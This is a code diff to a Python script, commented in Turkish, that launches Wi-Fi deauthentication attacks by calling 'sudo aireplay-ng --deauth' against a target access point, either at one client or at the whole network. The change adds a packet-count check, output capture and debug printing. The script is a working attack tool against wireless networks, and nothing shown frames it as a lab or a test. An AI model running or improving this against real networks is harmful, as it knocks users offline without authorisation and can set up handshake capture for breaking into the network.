@@ -64,12 +64,24 @@ def select_deauth_packet_count():
 
 # Deauthentication saldırısını başlatma
 def start_deauth_attack(target_mac, client_mac, packet_count):
+    if not str(packet_count).isdigit():  # Sayısal olmayan girişleri kontrol et
+        print("[-] Invalid packet count, defaulting to 10.")
+        packet_count = "10"  # Varsayılan olarak 10 paket gönder
+    
+    print(f"[*] Running attack with {packet_count} packets...")
+
     if client_mac:
         print(f"[*] Attacking {client_mac} in {target_mac} network...")
-        subprocess.run(["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-c", client_mac, "-i", "wlan0mon", "--ignore-negative-one"])
+        result = subprocess.run(["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-c", client_mac, "-i", "wlan0mon", "--ignore-negative-one"], capture_output=True, text=True)
     else:
         print(f"[*] Attacking entire {target_mac} network...")
-        subprocess.run(["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-i", "wlan0mon", "--ignore-negative-one"])
+        result = subprocess.run(["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-i", "wlan0mon", "--ignore-negative-one"], capture_output=True, text=True)
+
+    print("[DEBUG] Command Output:", result.stdout)
+    print("[DEBUG] Command Error:", result.stderr)
+
+    if result.returncode != 0:
+        print("[-] Error executing aireplay-ng! Check permissions or dependencies.")
 
 # Ana akış
 def main():
